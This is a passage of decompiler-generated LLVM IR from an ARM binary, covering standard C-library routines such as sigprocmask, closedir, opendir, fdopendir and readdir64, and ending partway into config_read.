  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d858 = load i32, i32* @r7, align 4
  store i32 %v3_d858, i32* %stack_var_-8, align 4
  %v0_d864 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d864, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d864, -4095
  br i1 %tmp, label %dec_label_pc_d884, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %entry
  %v0_d874 = call i32 @__GI___errno_location()
  %v0_d878 = load i32, i32* %r7.global-to-local, align 4
  %v1_d878 = sub i32 0, %v0_d878
  %v2_d87c = inttoptr i32 %v0_d874 to i32*
  store i32 %v1_d878, i32* %v2_d87c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_d884.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d884

dec_label_pc_d884:                                ; preds = %entry, %dec_label_pc_d874
  %v1_d888 = phi i32 [ %v0_d864, %entry ], [ -1, %dec_label_pc_d874 ]
  %v2_d884 = phi i32 [ %v3_d858, %entry ], [ %v2_d884.pre, %dec_label_pc_d874 ]
  store i32 %v2_d884, i32* @r7, align 4
  ret i32 %v1_d888

; uselistorder directives
  uselistorder i32 %v0_d864, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d884, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d88c = load i32, i32* @r7, align 4
  store i32 %v3_d88c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_d8b8, label %dec_label_pc_d8a8

dec_label_pc_d8a8:                                ; preds = %entry
  %v0_d8a8 = call i32 @__GI___errno_location()
  %v0_d8ac = load i32, i32* %r7.global-to-local, align 4
  %v1_d8ac = sub i32 0, %v0_d8ac
  %v2_d8b0 = inttoptr i32 %v0_d8a8 to i32*
  store i32 %v1_d8ac, i32* %v2_d8b0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_d8bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d8b8

dec_label_pc_d8b8:                                ; preds = %entry, %dec_label_pc_d8a8
  %v2_d8bc = phi i32 [ %v3_d88c, %entry ], [ %v2_d8bc.pre, %dec_label_pc_d8a8 ]
  %v0_d8b8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_d8a8 ]
  store i32 %v2_d8bc, i32* @r7, align 4
  ret i32 %v0_d8b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d8b8, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_d8c4 = load i32, i32* @r4, align 4
  store i32 %v3_d8c4, i32* %stack_var_-24, align 4
  %v2_d8c8 = load i32, i32* %arg1, align 4
  store i32 %v2_d8c8, i32* %r4.global-to-local, align 4
  %v3_d8d0 = icmp eq i32 %v2_d8c8, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r6, align 4
  br i1 %v3_d8d0, label %dec_label_pc_d8e4, label %dec_label_pc_d8f8

dec_label_pc_d8e4:                                ; preds = %entry
  %v0_d8e4 = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_d8ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d8ec, i32* %r2.global-to-local, align 4
  %v2_d8f0 = inttoptr i32 %v0_d8e4 to i32*
  store i32 9, i32* %v2_d8f0, align 4
  %v0_d998.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d998

dec_label_pc_d8f8:                                ; preds = %entry
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_d8fc = add i32 %tmp, 24
  store i32 %v1_d8fc, i32* %r4.global-to-local, align 4
  store i32 %v1_d8fc, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_d910 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_d910)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_d928 = load i32, i32* @r6, align 4
  %v2_d928 = add i32 %v0_d928, 16
  %v3_d928 = inttoptr i32 %v2_d928 to i32*
  %v4_d928 = load i32, i32* %v3_d928, align 4
  call void @__pseudo_branch(i32 %v4_d928)
  %v0_d934 = load i32, i32* @r7, align 4
  %v1_d934 = inttoptr i32 %v0_d934 to i32*
  %v2_d934 = load i32, i32* %v1_d934, align 4
  store i32 %v2_d934, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_d944 = load i32, i32* @r8, align 4
  store i32 %v0_d944, i32* %v1_d934, align 4
  %v0_d948 = load i32, i32* @r6, align 4
  %v1_d948 = load i32, i32* %r3.global-to-local, align 4
  %v2_d948 = add i32 %v1_d948, %v0_d948
  %v3_d948 = inttoptr i32 %v2_d948 to i32*
  %v4_d948 = load i32, i32* %v3_d948, align 4
  store i32 ptrtoint (i32* @global_var_d954.224 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_d948)
  %v0_d954 = load i32, i32* @r7, align 4
  %v1_d954 = add i32 %v0_d954, 12
  %v2_d954 = inttoptr i32 %v1_d954 to i32*
  %v3_d954 = load i32, i32* %v2_d954, align 4
  store i32 %v3_d954, i32* @r0, align 4
  %v0_d958 = call i32 @free()
  %v0_d95c = load i32, i32* @r7, align 4
  store i32 %v0_d95c, i32* @r0, align 4
  %v0_d960 = call i32 @free()
  %v0_d968 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_d968, -4095
  br i1 %tmp11, label %dec_label_pc_d994, label %dec_label_pc_d984

dec_label_pc_d984:                                ; preds = %dec_label_pc_d8f8
  %v0_d984 = call i32 @__GI___errno_location()
  %v0_d988 = load i32, i32* @r4, align 4
  %v1_d988 = sub i32 0, %v0_d988
  store i32 %v1_d988, i32* %r3.global-to-local, align 4
  %v2_d98c = inttoptr i32 %v0_d984 to i32*
  store i32 %v1_d988, i32* %v2_d98c, align 4
  %v0_d990 = load i32, i32* @r8, align 4
  br label %dec_label_pc_d994

dec_label_pc_d994:                                ; preds = %dec_label_pc_d8f8, %dec_label_pc_d984
  %v0_d994 = phi i32 [ %v0_d968, %dec_label_pc_d8f8 ], [ %v0_d990, %dec_label_pc_d984 ]
  store i32 %v0_d994, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d998

dec_label_pc_d998:                                ; preds = %dec_label_pc_d8e4, %dec_label_pc_d994
  %v0_d998 = phi i32 [ %v0_d998.pre, %dec_label_pc_d8e4 ], [ %v0_d994, %dec_label_pc_d994 ]
  %v2_d9a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d9a0, i32* %r4.global-to-local, align 4
  ret i32 %v0_d998

; uselistorder directives
  uselistorder i32 %v0_d968, { 1, 0 }
  uselistorder label %dec_label_pc_d998, { 1, 0 }
  uselistorder label %dec_label_pc_d994, { 1, 0 }
}

define i32 @function_d9ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_d9ac:
  %v0_d9ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d9ac, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_d9ac
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_d9ac, %bb
  %v10_d9b8 = phi i32 [ %arg1, %dec_label_pc_d9ac ], [ 0, %bb ]
  ret i32 %v10_d9b8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_d9bc = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_d9d0 = call i32 @malloc(i32 48)
  %v2_d9d8 = icmp eq i32 %v1_d9d0, 0
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r6, align 4
  br i1 %v2_d9d8, label %bb, label %dec_label_pc_d9e8

bb:                                               ; preds = %entry
  br label %dec_label_pc_da74

dec_label_pc_d9e8:                                ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d9ec = load i32, i32* @r4, align 4
  %v2_d9ec = icmp ugt i32 %v0_d9ec, 511
  %v2_d9f0 = add i32 %v1_d9d0, 4
  %v3_d9f0 = inttoptr i32 %v2_d9f0 to i32*
  store i32 0, i32* %v3_d9f0, align 4
  %v0_d9f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_d9f4 = add i32 %v1_d9d0, 16
  %v3_d9f4 = inttoptr i32 %v2_d9f4 to i32*
  store i32 %v0_d9f4, i32* %v3_d9f4, align 4
  %v0_d9f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_d9f8 = add i32 %v1_d9d0, 8
  %v3_d9f8 = inttoptr i32 %v2_d9f8 to i32*
  store i32 %v0_d9f8, i32* %v3_d9f8, align 4
  br i1 %v2_d9ec, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_d9e8
  %v0_da002 = load i32, i32* @r4, align 4
  %v2_da003 = add i32 %v1_d9d0, 20
  %v3_da004 = inttoptr i32 %v2_da003 to i32*
  store i32 %v0_da002, i32* %v3_da004, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_d9e8
  %v1_d9fc = load i32, i32* %r3.global-to-local, align 4
  %v2_d9fc = add i32 %v1_d9fc, 512
  store i32 %v2_d9fc, i32* %r3.global-to-local, align 4
  %v0_da00 = load i32, i32* @r4, align 4
  %v2_da00 = add i32 %v1_d9d0, 20
  %v3_da00 = inttoptr i32 %v2_da00 to i32*
  store i32 %v0_da00, i32* %v3_da00, align 4
  %v1_da04 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_da04, i32* %v3_da00, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_d9d0, i32* @r5, align 4
  %v0_da0c = load i32, i32* @r7, align 4
  %v2_da0c = inttoptr i32 %v1_d9d0 to i32*
  store i32 %v0_da0c, i32* %v2_da0c, align 4
  %v0_da10 = load i32, i32* @r5, align 4
  %v1_da10 = add i32 %v0_da10, 20
  %v2_da10 = inttoptr i32 %v1_da10 to i32*
  %v3_da10 = load i32, i32* %v2_da10, align 4
  store i32 %v3_da10, i32* %r1.global-to-local, align 4
  %v2_da18 = call i32 @calloc(i32 1, i32 %v3_da10)
  %v2_da1c = icmp eq i32 %v2_da18, 0
  store i32 %v2_da18, i32* @r4, align 4
  %v1_da24 = load i32, i32* @r5, align 4
  %v2_da24 = add i32 %v1_da24, 12
  %v3_da24 = inttoptr i32 %v2_da24 to i32*
  store i32 %v2_da18, i32* %v3_da24, align 4
  br i1 %v2_da1c, label %dec_label_pc_da2c, label %dec_label_pc_da3c

dec_label_pc_da2c:                                ; preds = %bb17
  %v0_da2c = load i32, i32* @r5, align 4
  store i32 %v0_da2c, i32* @r0, align 4
  %v0_da30 = call i32 @free()
  %v0_da34 = load i32, i32* @r4, align 4
  br label %dec_label_pc_da74

dec_label_pc_da3c:                                ; preds = %bb17
  %v0_da40 = load i32, i32* @r6, align 4
  %v2_da40 = add i32 %v0_da40, -37352
  store i32 %v2_da40, i32* %r3.global-to-local, align 4
  %v1_da48 = inttoptr i32 %v2_da40 to i32*
  %v2_da48 = load i32, i32* %v1_da48, align 4
  %v3_da48 = add i32 %v0_da40, -37348
  %v4_da48 = inttoptr i32 %v3_da48 to i32*
  %v5_da48 = load i32, i32* %v4_da48, align 4
  store i32 %v5_da48, i32* %r1.global-to-local, align 4
  %v6_da48 = add i32 %v0_da40, -37344
  %v7_da48 = inttoptr i32 %v6_da48 to i32*
  %v8_da48 = load i32, i32* %v7_da48, align 4
  store i32 %v8_da48, i32* %r2.global-to-local, align 4
  %v9_da48 = add i32 %v0_da40, -37340
  %v10_da48 = inttoptr i32 %v9_da48 to i32*
  %v11_da48 = load i32, i32* %v10_da48, align 4
  store i32 %v11_da48, i32* %r3.global-to-local, align 4
  %v12_da48 = add i32 %v0_da40, -37336
  %v1_da54 = inttoptr i32 %v12_da48 to i32*
  %v2_da54 = load i32, i32* %v1_da54, align 4
  %v3_da54 = add i32 %v0_da40, -37332
  %v4_da54 = inttoptr i32 %v3_da54 to i32*
  %v5_da54 = load i32, i32* %v4_da54, align 4
  store i32 %v2_da54, i32* %stack_var_-32, align 4
  store i32 %v5_da48, i32* %r1.global-to-local, align 4
  store i32 %v8_da48, i32* %r2.global-to-local, align 4
  store i32 %v11_da48, i32* %r3.global-to-local, align 4
  %v0_da64 = load i32, i32* @r5, align 4
  %v1_da64 = add i32 %v0_da64, 24
  %v1_da68 = inttoptr i32 %v1_da64 to i32*
  store i32 %v2_da48, i32* %v1_da68, align 4
  %v3_da68 = add i32 %v0_da64, 28
  %v4_da68 = inttoptr i32 %v3_da68 to i32*
  %v5_da68 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_da68, i32* %v4_da68, align 4
  %v6_da68 = add i32 %v0_da64, 32
  %v7_da68 = inttoptr i32 %v6_da68 to i32*
  %v8_da68 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_da68, i32* %v7_da68, align 4
  %v9_da68 = add i32 %v0_da64, 36
  %v10_da68 = inttoptr i32 %v9_da68 to i32*
  %v11_da68 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_da68, i32* %v10_da68, align 4
  %v12_da68 = add i32 %v0_da64, 40
  %v2_da6c = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_da54, i32* %r1.global-to-local, align 4
  %v1_da70 = inttoptr i32 %v12_da68 to i32*
  store i32 %v2_da6c, i32* %v1_da70, align 4
  %v3_da70 = add i32 %v0_da64, 44
  %v4_da70 = inttoptr i32 %v3_da70 to i32*
  %v5_da70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_da70, i32* %v4_da70, align 4
  %v0_da74.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_da74

dec_label_pc_da74:                                ; preds = %bb, %dec_label_pc_da2c, %dec_label_pc_da3c
  %v0_da74 = phi i32 [ 0, %bb ], [ %v0_da34, %dec_label_pc_da2c ], [ %v0_da74.pre, %dec_label_pc_da3c ]
  store i32 %v12_d9bc, i32* @r7, align 4
  ret i32 %v0_da74

; uselistorder directives
  uselistorder i32 %v2_da18, { 1, 0, 2 }
  uselistorder i32 %v1_d9d0, { 6, 5, 4, 0, 1, 2, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_da74, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_da94 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_dabc, label %dec_label_pc_daac

dec_label_pc_daac:                                ; preds = %entry
  %v0_daac = call i32 @__GI___errno_location()
  %v0_dab0 = load i32, i32* @r7, align 4
  %v1_dab0 = sub i32 0, %v0_dab0
  %v2_dab4 = inttoptr i32 %v0_daac to i32*
  store i32 %v1_dab0, i32* %v2_dab4, align 4
  br label %dec_label_pc_dae0

dec_label_pc_dabc:                                ; preds = %entry
  %v1_dabc = icmp slt i32 %arg1, 0
  br i1 %v1_dabc, label %dec_label_pc_dae0, label %dec_label_pc_dac4

dec_label_pc_dac4:                                ; preds = %dec_label_pc_dabc
  store i32 %v2_da94, i32* @r1, align 4
  %v0_dac8 = call i32 @fstat()
  %v1_dacc = icmp slt i32 %v0_dac8, 0
  br i1 %v1_dacc, label %dec_label_pc_dad4, label %dec_label_pc_dae8

dec_label_pc_dad4:                                ; preds = %dec_label_pc_dac4
  br label %dec_label_pc_dae0

dec_label_pc_dae0:                                ; preds = %dec_label_pc_dad4, %dec_label_pc_dabc, %dec_label_pc_daac
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_db24

dec_label_pc_dae8:                                ; preds = %dec_label_pc_dac4
  %v0_daf0 = load i32, i32* @r7, align 4
  %v3_daf4 = call i32 @__GI___fcntl_nocancel(i32 %v0_daf0, i32 2, i32 1)
  %v0_daf8 = load i32, i32* @r7, align 4
  %v2_db00 = call i32 @fd_to_DIR(i32 %v0_daf8, i32 %tmp)
  store i32 %v2_db00, i32* %r4.global-to-local, align 4
  %v2_db04 = icmp eq i32 %v2_db00, 0
  br i1 %v2_db04, label %dec_label_pc_db0c, label %dec_label_pc_db24

dec_label_pc_db0c:                                ; preds = %dec_label_pc_dae8
  %v0_db18 = call i32 @__GI___errno_location()
  %v2_db20 = inttoptr i32 %v0_db18 to i32*
  store i32 12, i32* %v2_db20, align 4
  %v0_db24.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_db24

dec_label_pc_db24:                                ; preds = %dec_label_pc_dae8, %dec_label_pc_dae0, %dec_label_pc_db0c
  %v0_db24 = phi i32 [ %v2_db00, %dec_label_pc_dae8 ], [ 0, %dec_label_pc_dae0 ], [ %v0_db24.pre, %dec_label_pc_db0c ]
  ret i32 %v0_db24

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_db24, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_db3c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_db3c, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_db48 = call i32 @fstat()
  store i32 %v0_db48, i32* @r5, align 4
  %v2_db4c = icmp eq i32 %v0_db48, 0
  br i1 %v2_db4c, label %dec_label_pc_db54, label %dec_label_pc_dbbc

dec_label_pc_db54:                                ; preds = %entry
  %v1_db58 = and i32 %tmp4, 61440
  store i32 %v1_db58, i32* @r3, align 4
  %v7_db5c = icmp eq i32 %v1_db58, 16384
  br i1 %v7_db5c, label %dec_label_pc_db74, label %dec_label_pc_db64

dec_label_pc_db64:                                ; preds = %dec_label_pc_db54
  %v0_db64 = call i32 @__GI___errno_location()
  br label %dec_label_pc_dba0

dec_label_pc_db74:                                ; preds = %dec_label_pc_db54
  %v0_db74 = load i32, i32* @r4, align 4
  %v2_db7c = call i32 @__libc_fcntl(i32 %v0_db74, i32 3)
  %v7_db80 = icmp eq i32 %v2_db7c, -1
  br i1 %v7_db80, label %dec_label_pc_dbbc, label %dec_label_pc_db88

dec_label_pc_db88:                                ; preds = %dec_label_pc_db74
  %v1_db88 = urem i32 %v2_db7c, 4
  %v7_db8c = icmp eq i32 %v1_db88, 1
  br i1 %v7_db8c, label %dec_label_pc_db94, label %dec_label_pc_dba8

dec_label_pc_db94:                                ; preds = %dec_label_pc_db88
  %v0_db94 = call i32 @__GI___errno_location()
  br label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_db64, %dec_label_pc_db94
  %storemerge2 = phi i32 [ %v0_db64, %dec_label_pc_db64 ], [ %v0_db94, %dec_label_pc_db94 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_db64 ], [ 22, %dec_label_pc_db94 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_dba0 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_dba0, align 4
  %v0_dbc0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dbc0

dec_label_pc_dba8:                                ; preds = %dec_label_pc_db88
  %v0_dba8 = load i32, i32* @r4, align 4
  %v2_dbb0 = call i32 @fd_to_DIR(i32 %v0_dba8, i32 %tmp)
  store i32 %v2_dbb0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dbc0

dec_label_pc_dbbc:                                ; preds = %entry, %dec_label_pc_db74
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dbc0

dec_label_pc_dbc0:                                ; preds = %dec_label_pc_dba8, %dec_label_pc_dba0, %dec_label_pc_dbbc
  %v0_dbc0 = phi i32 [ %v2_dbb0, %dec_label_pc_dba8 ], [ %v0_dbc0.pre, %dec_label_pc_dba0 ], [ 0, %dec_label_pc_dbbc ]
  ret i32 %v0_dbc0

; uselistorder directives
  uselistorder i32 %v2_db7c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_dbc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbbc, { 1, 0 }
  uselistorder label %dec_label_pc_dba0, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r6, align 4
  %v1_dbe4 = add i32 %tmp, 24
  store i32 %v1_dbe4, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_dbfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  store i32 %v4_dbfc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_dbfc)
  %v0_dc10 = load i32, i32* @r6, align 4
  %v2_dc10 = add i32 %v0_dc10, 16
  %v3_dc10 = inttoptr i32 %v2_dc10 to i32*
  %v4_dc10 = load i32, i32* %v3_dc10, align 4
  store i32 %v4_dc10, i32* %ip.global-to-local, align 4
  store i32 56348, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_dc10)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_dc20

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dc50, %entry
  %v0_dc20 = load i32, i32* @r5, align 4
  %v1_dc20 = add i32 %v0_dc20, 4
  %v2_dc20 = inttoptr i32 %v1_dc20 to i32*
  %v3_dc20 = load i32, i32* %v2_dc20, align 4
  %v4_dc20 = add i32 %v0_dc20, 8
  %v5_dc20 = inttoptr i32 %v4_dc20 to i32*
  %v6_dc20 = load i32, i32* %v5_dc20, align 4
  %tmp10 = icmp ugt i32 %v6_dc20, %v3_dc20
  br i1 %tmp10, label %dec_label_pc_dc50, label %dec_label_pc_dc2c

dec_label_pc_dc2c:                                ; preds = %dec_label_pc_dc20
  %v1_dc2c = inttoptr i32 %v0_dc20 to i32*
  %v2_dc2c = load i32, i32* %v1_dc2c, align 4
  %v1_dc30 = add i32 %v0_dc20, 12
  %v2_dc30 = inttoptr i32 %v1_dc30 to i32*
  %v3_dc30 = load i32, i32* %v2_dc30, align 4
  %v1_dc34 = add i32 %v0_dc20, 20
  %v2_dc34 = inttoptr i32 %v1_dc34 to i32*
  %v3_dc34 = load i32, i32* %v2_dc34, align 4
  %v4_dc38 = inttoptr i32 %v3_dc30 to i32*
  %v5_dc38 = call i32 @__getdents64(i32 %v2_dc2c, i32* %v4_dc38, i32 %v3_dc34, i32 %v6_dc20)
  %tmp9 = icmp slt i32 %v5_dc38, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_dc48

.thread:                                          ; preds = %dec_label_pc_dc2c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_dc80

dec_label_pc_dc48:                                ; preds = %dec_label_pc_dc2c
  %v1_dc48 = load i32, i32* @r5, align 4
  %v2_dc48 = add i32 %v1_dc48, 8
  %v3_dc48 = inttoptr i32 %v2_dc48 to i32*
  store i32 %v5_dc38, i32* %v3_dc48, align 4
  %v0_dc4c = load i32, i32* @r7, align 4
  %v1_dc4c = load i32, i32* @r5, align 4
  %v2_dc4c = add i32 %v1_dc4c, 4
  %v3_dc4c = inttoptr i32 %v2_dc4c to i32*
  store i32 %v0_dc4c, i32* %v3_dc4c, align 4
  %v0_dc50.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dc50

dec_label_pc_dc50:                                ; preds = %dec_label_pc_dc20, %dec_label_pc_dc48
  %v1_dc74 = phi i32 [ %v0_dc20, %dec_label_pc_dc20 ], [ %v0_dc50.pre, %dec_label_pc_dc48 ]
  %v1_dc50 = add i32 %v1_dc74, 4
  %v2_dc50 = inttoptr i32 %v1_dc50 to i32*
  %v3_dc50 = load i32, i32* %v2_dc50, align 4
  %v1_dc54 = add i32 %v1_dc74, 12
  %v2_dc54 = inttoptr i32 %v1_dc54 to i32*
  %v3_dc54 = load i32, i32* %v2_dc54, align 4
  %v2_dc58 = add i32 %v3_dc54, %v3_dc50
  store i32 %v2_dc58, i32* @r4, align 4
  %v3_dc5c = inttoptr i32 %v2_dc58 to i32*
  %v4_dc5c = load i32, i32* %v3_dc5c, align 4
  %v1_dc60 = add i32 %v2_dc58, 4
  %v2_dc60 = inttoptr i32 %v1_dc60 to i32*
  %v3_dc60 = load i32, i32* %v2_dc60, align 4
  %v1_dc64 = add i32 %v2_dc58, 16
  %v2_dc64 = inttoptr i32 %v1_dc64 to i16*
  %v3_dc64 = load i16, i16* %v2_dc64, align 2
  %v4_dc64 = zext i16 %v3_dc64 to i32
  %v1_dc68 = add i32 %v2_dc58, 8
  %v2_dc68 = inttoptr i32 %v1_dc68 to i32*
  %v3_dc68 = load i32, i32* %v2_dc68, align 4
  store i32 %v3_dc68, i32* %ip.global-to-local, align 4
  %v2_dc6c = add i32 %v4_dc64, %v3_dc50
  %v2_dc70 = or i32 %v3_dc60, %v4_dc5c
  %v4_dc70 = icmp eq i32 %v2_dc70, 0
  store i32 %v2_dc6c, i32* %v2_dc50, align 4
  %v0_dc78 = load i32, i32* %ip.global-to-local, align 4
  %v1_dc78 = load i32, i32* @r5, align 4
  %v2_dc78 = add i32 %v1_dc78, 16
  %v3_dc78 = inttoptr i32 %v2_dc78 to i32*
  store i32 %v0_dc78, i32* %v3_dc78, align 4
  br i1 %v4_dc70, label %dec_label_pc_dc20, label %dec_label_pc_dc80

dec_label_pc_dc80:                                ; preds = %dec_label_pc_dc50, %.thread
  %v0_dc8c = load i32, i32* @r6, align 4
  %v2_dc8c = add i32 %v0_dc8c, 24
  %v3_dc8c = inttoptr i32 %v2_dc8c to i32*
  %v4_dc8c = load i32, i32* %v3_dc8c, align 4
  store i32 %v4_dc8c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_dc8c)
  %v0_dc98 = load i32, i32* @r4, align 4
  ret i32 %v0_dc98

; uselistorder directives
  uselistorder i32 %v2_dc58, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_dc74, { 1, 0 }
  uselistorder i32 %v6_dc20, { 1, 0 }
  uselistorder i32 %v0_dc20, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_dc50, { 1, 0 }
}

define i32 @function_dcac(i32 %arg1) local_unnamed_addr {
dec_label_pc_dcac:
  %v0_dcac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dcac, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_dcac
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_dcac, %bb
  %v10_dcb8 = phi i32 [ %arg1, %dec_label_pc_dcac ], [ 0, %bb ]
  ret i32 %v10_dcb8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 1304)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_dcd8 = load i32, i32* @r4, align 4
  %v6_dcd8 = load i32, i32* @r5, align 4
  %v9_dcd8 = load i32, i32* @r6, align 4
  %v12_dcd8 = load i32, i32* @r7, align 4
  %v15_dcd8 = load i32, i32* @r8, align 4
  %v18_dcd8 = load i32, i32* @sb, align 4
  %v21_dcd8 = load i32, i32* @sl, align 4
  %v24_dcd8 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
